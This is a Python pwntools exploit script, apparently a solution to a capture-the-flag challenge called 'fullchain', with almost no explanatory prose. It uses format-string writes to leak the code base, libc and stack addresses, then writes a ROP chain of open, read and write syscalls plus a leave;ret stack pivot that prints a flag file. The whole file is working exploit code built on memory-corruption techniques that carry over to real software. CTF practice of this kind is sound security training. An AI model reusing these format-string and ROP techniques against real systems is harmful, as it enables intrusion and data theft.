from pwn import *
r = process('./fullchain')
# r = remote('edu-ctf.zoolab.org', 30201)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']


# def mywrite(pos, r):
#     r.sendlineafter("local > ", pos.encode())
#     r.sendlineafter("write > ", b"write")
#     print("sent write")


# def myread(data, pos, r):
#     r.sendlineafter("local > ", pos.encode())
#     r.sendlineafter("write > ", b"read")
#     r.sendline(data)
#     print("sent read")


def myset(pos, d, n, r):
    r.sendlineafter("local > ", pos.encode())
    r.sendlineafter("write > ", b"set")
    r.sendlineafter("data > ", str(d).encode())
    r.sendlineafter("length > ", str(n).encode())

def write_addr(pos, addr, prev, r):
    # write addr: 0x58383020
    addr = addr[2:]
    addr = '0'*(16 - len(addr)) + addr
    # TODO: optimization
    prev_ = ""
    if prev[0] != '!':
        leng = 10
        idx = 12
        for i in range(2):
            ar = addr[idx:idx+2]
                
            if prev[idx:idx+2] != ar and prev_ != ar:
                myset(pos, int(ar, 16), leng, r)
                prev_ = ar
            leng -= 1
            idx += 2
    else: # == '!'
        leng = 14
        idx = 4
        for i in range(6):
            ar = addr[idx:idx+2]
                
            if prev[idx:idx+2] != ar and prev_ != ar:
                myset(pos, int(ar, 16), leng, r)
                prev_ = ar
            leng -= 1
            idx += 2
    
    return addr


# 1. Use fmt to overlap cnt value
exploit = int('0x47', 16)
exploit2 = 255 - 0x47
fmt_payload = f"%{exploit}c%10$hhn%{exploit2}c%18$hhn\0"

while True:
    try:
        r.sendlineafter("global or local > ", b"global")
        r.sendlineafter("set, read or write > ", b"read")
        r.sendline(fmt_payload)

        # 1-1. make target show on stack
        r.sendlineafter("global or local > ", b"global")
        r.sendlineafter("set, read or write > ", b"write")

        # 1-2. write data to target()
        r.sendlineafter("global or local > ", b"global")
        r.sendlineafter("set, read or write > ", b"write")

        # 1-3. write data to target()
        r.sendlineafter("global or local > ", b"global")
        r.sendlineafter("set, read or write > ", b"write")
        break
    except:
        r.close()
        r = process('./fullchain')
        # r = remote('edu-ctf.zoolab.org', 30201)

# Successfully modify cnt

# 2. Leak code base address
fmt_payload = b"%7$p\0"

r.sendlineafter("global or local > ", b"global")
r.sendlineafter("set, read or write > ", b"read")
r.sendline(fmt_payload)

r.sendlineafter("global or local > ", b"global")
r.sendlineafter("set, read or write > ", b"write")

resp = r.recv(14).decode()
# print("resp: ", resp)
global_addr = int(resp, 16)
# print("global: ", hex(global_addr))

code_base = global_addr - 0x40b0
printf_glt = code_base + 0x4048

# 3. Leak libc: 
# 3-1. write printf_glt to buffer,
# 3-2. leak from fmt
prev = "!"*16
prev = write_addr('local', hex(printf_glt), prev, r)
prev = "!"*16

fmt_payload = b"%15$s\0"

r.sendlineafter("global or local > ", b"global")
r.sendlineafter("set, read or write > ", b"read")
r.sendline(fmt_payload)

r.sendlineafter("global or local > ", b"global")
r.sendlineafter("set, read or write > ", b"write")
resp = r.recv()
resp = resp[:resp.find(b'global')]
# print("resp: ", resp)
a = int.from_bytes(resp, 'little')
# print("printf_glt: ", hex(a))
libc_base = a - 0x64e10

leave_ret = 0x000000000005aa48 + libc_base

pop_rdi_ret = 0x0000000000026b72 + libc_base
pop_rsi_ret = 0x0000000000027529 + libc_base
pop_rdx_rbx_ret = 0x0000000000162866 + libc_base
pop_rax_ret = 0x000000000004a550 + libc_base
syscall_ret = 0x0000000000066229 + libc_base

open_syscode = 0x02 # open
read_syscode = 0x00 # read
write_syscode = 0x01 # write

# 4. Leak stack
fmt_payload = b"%10$p\0"

# r.sendlineafter("global or local > ", b"global")
r.sendline("global")
r.sendlineafter("set, read or write > ", b"read")
r.sendline(fmt_payload)

r.sendlineafter("global or local > ", b"global")
r.sendlineafter("set, read or write > ", b"write")

resp = r.recv(14).decode()
# print("resp: ", resp)
# stack_off, ret main
old_rbp = int(resp, 16)
# print("old_rbp: ", hex(old_rbp))

local_addr = old_rbp - 0x20
rop_payload_addr = old_rbp


mywrite_rbp = old_rbp - 0x40
mywrite_ret = mywrite_rbp + 0x08

    
def convert(addr, j):
    # j from 0~7
    # convert an 8 byte address to two 4 byte
    res = hex(addr)[2:]
    # pad zero
    # while len(res) < 16:
        # res = '0' + res
    res = '0' * (16 - len(res)) + res
    res_seg = res[ 2*(7-j) : 2*(7-j) + 2]
    return int(res_seg, 16)
    res1, res2, res3, res4 = res[:4], res[4:8], res[8:12], res[12:]
    if j == 0:
        return int(res4, 16) 
    elif j == 1:
        return int(res3, 16)
    elif j == 2:
        return int(res2, 16)
    else:
        return int(res1, 16)


def write_payload(rop_payload):
    idx = 0
    offset = 0x0
    global prev

    while idx < len(rop_payload):
        # 5-1. write address to local(0x08~0x18)
        for j in range(8):
            payload_addrs =  rop_payload_addr + offset
            # write 2 commands (0x08+0x08=0x10)
            # 0x7ffc3ade6cc0
            prev = write_addr('local', hex(payload_addrs), prev, r)
            offset += 0x01
            
            # r.sendlineafter("write", b"read") # Can't use read to read addresss, may contain non-pritable char

            # 5-2. use fmt to write payload to address
            num = 15 # local+0x08
            # convert to num
            cmds = convert(rop_payload[idx], j)
            # print("Write 1:", hex(rop_payload[idx]))
            fmt_payload = f"%{num}$hhn\0"

            if cmds != 0:
                fmt_payload = f"%{cmds}c%{num}$hhn\0"
            r.sendlineafter("local > ", b"global")
            r.sendlineafter("write > ", b"read")
            r.sendline(fmt_payload.encode())

            r.sendlineafter("local > ", b"global")
            r.sendlineafter("write > ", b"write")

            # myread(fmt_payload.encode(), "global", r)
            # mywrite("global", r)
        idx += 1
        # break
    # write filename

# 5. Write rop chain and rop pivot to mywrite
def write_pivot():
    global prev
    # 5-1: write write_rbp, write_ret address to old_rbp:
    # 5-2: write rop_payload_addr and leave_ret address to write_rbp, write_ret

    rop_real_addr = rop_payload_addr  + 0x78
    buf = {}
    rop_real_addr_hex = hex(rop_real_addr)[2:]
    rop_real_addr_hex = '0' * (16 - len(rop_real_addr_hex)) + rop_real_addr_hex
    leave_ret_hex = hex(leave_ret)[2:]
    leave_ret_hex = '0' * (16 - len(leave_ret_hex)) + leave_ret_hex
    
    idx = 14
    start_idx = 18
    for i in range(start_idx, start_idx + 8):
        # from written addr to int
        buf[i] = int(rop_real_addr_hex[idx:idx+2], 16)
        idx -= 2
    
    idx = 14
    for i in range(start_idx + 8, start_idx + 16):
        buf[i] = int(leave_ret_hex[idx:idx+2], 16)
        idx -= 2

    # Since this fmt payload must be written at once, sort the payload and calculate offset
    fmt_payload = ""
    cur = 0x10
    for k, v in sorted(buf.items(), key = lambda x: x[1]):
        if v == 0:
            # fmt_payload += f"%{k}$hhn"
            continue
        else:
            if v - cur == 0:
                fmt_payload += f"%{k}$hhn"
            else:
                fmt_payload += f"%{v - cur}c%{k}$hhn"
        cur = v
    fmt_payload += '\0'

    # print("leng: ", len(fmt_payload.encode()))

    fmt_payload_addr = global_addr + 0x10
    offset =  0
    hex_payload = hex(int.from_bytes(fmt_payload.encode(), 'little'))[2:]
    fmt_payloads = []
    idx = len(hex_payload) - 16
    while 1:
        if idx < 0:
            fmt_payloads.append('0'*(-idx) + hex_payload[:idx+16])
            break
        fmt_payloads.append(hex_payload[idx: idx+16])
        idx -= 16

    # Write filename
    file_st = hex(int.from_bytes(b'/home/fullchain/flag\x00', 'little'))[2:]
    idx = len(file_st) - 16
    while 1:
        if idx < 0:
            fmt_payloads.append('0'*(-idx) + file_st[:idx+16])
            break
        fmt_payloads.append(file_st[idx: idx+16])
        idx -= 16

    # write fmt payoad to global

    file_offset = len(fmt_payloads)

    # calculate file address location offset
    if file_offset == 20:
        file_addr = global_addr + 0x98
    else:
        file_addr = global_addr + 0x90

    # 5-3. Write ROP chain and stored at local
    rop_payload = [
        mywrite_rbp, mywrite_rbp + 0x01,
        mywrite_rbp + 0x02, mywrite_rbp + 0x03,
        mywrite_rbp + 0x04, mywrite_rbp + 0x05,
        mywrite_rbp + 0x06, mywrite_rbp + 0x07,
        mywrite_ret, mywrite_ret + 0x01,
        mywrite_ret + 0x02, mywrite_ret + 0x03,
        mywrite_ret + 0x04, mywrite_ret + 0x05,
        mywrite_ret + 0x06, mywrite_ret + 0x07,
        # 0xdeadbeef,
        pop_rdi_ret, file_addr,
        pop_rsi_ret, 0,
        pop_rax_ret, open_syscode,
        syscall_ret,

        pop_rdi_ret, 3, # guess fd = 3
        pop_rsi_ret, file_addr, # read to fn
        pop_rdx_rbx_ret, 0x30, 0x0, # len
        pop_rax_ret, read_syscode,
        syscall_ret,

        pop_rdi_ret, 1, # write to stdout
        # pop_rsi_ret, file_addr, # from fn
        # pop_rdx_rbx_ret, 0x30, 0x0,
        pop_rax_ret, write_syscode,
        syscall_ret
    ]
    write_payload(rop_payload)
    prev = "!"*16

    # 5-4: Write fmt payload and file name to global
    idx = 0
    # print("buf: ", buf)

    # print("fmt payload: ", fmt_payload)
    # print("fmt payloads", fmt_payloads)

    while idx < len(fmt_payloads):
        for j in range(8):
            prev = write_addr('local', hex(fmt_payload_addr + offset), prev,  r)
            offset += 0x01
            num = 15 # local+0x08
            # convert to num
            stt = fmt_payloads[idx][(7-j)*2: (7-j)*2+2]
            cmds = int(stt, 16)
            # print("Write 1:", hex(cmds))
            if cmds == 0:
                fmt_payload_1 = f"%{num}$hhn\0"
            else:
                fmt_payload_1 = f"%{cmds}c%{num}$hhn\0"
            r.sendlineafter("local > ", b"global")
            r.sendlineafter("write > ", b"read")
            r.sendline(fmt_payload_1.encode())

            r.sendlineafter("local > ", b"global")
            r.sendlineafter("write > ", b"write")
        idx += 1
        print(f"{idx}/{len(fmt_payloads)}")


    # 5-5: Replace first 16 bytes in global to concatenate with payload
    r.sendlineafter("local > ", b"global")
    r.sendlineafter("write > ", b"set")
    r.sendlineafter("data > ", str(ord("A")).encode() )
    r.sendlineafter("length > ", b'16')
    # print("myrbp: ", hex(mywrite_rbp))
    # print("myret: ", hex(mywrite_ret))
    # print("rop_real: ", hex(rop_real_addr))
    # print("leave_ret: ", hex(leave_ret))
    # print("file_addr: ", hex(file_addr))
    # gdb.attach(r)

    r.sendlineafter("global or local > ", b"global")
    r.sendlineafter("set, read or write > ", b"write")

write_pivot()
# r.recvuntil("FLAG")
# result = r.recvuntil("}")
# print("Flag: FLAG", result.decode())

r.interactive()
